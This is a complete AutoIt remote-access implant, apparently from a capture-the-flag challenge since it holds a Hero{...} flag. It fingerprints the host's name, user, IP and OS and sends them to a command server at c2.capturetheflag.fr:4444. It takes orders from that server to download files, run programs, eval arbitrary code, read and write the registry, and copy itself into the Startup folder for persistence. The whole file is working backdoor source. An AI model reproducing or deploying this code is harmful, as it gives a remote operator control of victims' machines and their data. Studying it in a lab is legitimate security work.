Global $splitter = "|||"
Global $host = "http://c2.capturetheflag.fr:4444"
Global $userAgent = "AutoInfector V1.0"
Global $flag = "Hero{Geof3nc1ng_R3str1ct10n5_4r3_n0t_3n0ugh}"


Func computerFingerprint()
    $fingerprint = ""
    $fingerprint &= @ComputerName & $splitter
    $fingerprint &= @UserName & $splitter
    $fingerprint &= @IPAddress1 & $splitter
    $fingerprint &= @OSVersion & $splitter
    $fingerprint &= @OSBuild
    return $fingerprint
EndFunc

Func pollServer()
    Local $winHttp = ObjCreate("winhttp.winhttprequest.5.1")
    $winHttp.Open("GET", $host & "/poll", False)
    $winHttp.SetRequestHeader("User-Agent", computerFingerprint())
    $winHttp.Send()

    Local $statusCode = $winHttp.Status
    If $statusCode = 200 Then
        Return $winHttp.ResponseText
    EndIf

    Return ""
EndFunc

Func sendServer($action, $data)
    Local $winHttp = ObjCreate("winhttp.winhttprequest.5.1")
    $winHttp.Open("POST", $host & "/send", False)
    $winHttp.SetRequestHeader("User-Agent", computerFingerprint())
    $winHttp.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
    $winHttp.Send($action & "=" & $data)
EndFunc

While ( true )
    Local $content = pollServer()
    Local $params = StringSplit($content, $splitter)
    Local $action = $params[1]

    If $action = "download" Then
        Local $url = $params[2]
        Local $file = $params[3]
        Local $data = InetRead($url, 1)
        FileWrite($file, $data)
    EndIf

    If $action = "execute" Then
        Local $file = $params[2]
        Run($file)
    EndIf

    if $action = "plugin" Then
        Local $code = $params[2]
        Eval($code)
    EndIf

    if $action = "regRead" Then
        Local $key = $params[2]
        Local $value = $params[3]
        Local $data = RegRead($key, $value)
        sendServer($action, $data)
    EndIf

    if $action = "regWrite" Then
        Local $key = $params[2]
        Local $value = $params[3]
        Local $data = $params[4]
        RegWrite($key, $value, $data)
    EndIf

    if $action = "persistence" Then
        Local $file = @ScriptFullPath
        Local $destination = @AppDataCommonDir & "\Microsoft\Windows\Start Menu\Programs\Startup\"
        FileCopy($file, $destination & @ScriptName, 1)
    EndIf

    if $action = "nothing" Then
        Sleep(5000)
    EndIf

    if $action = "exit" Then
        Exit
    EndIf
    
WEnd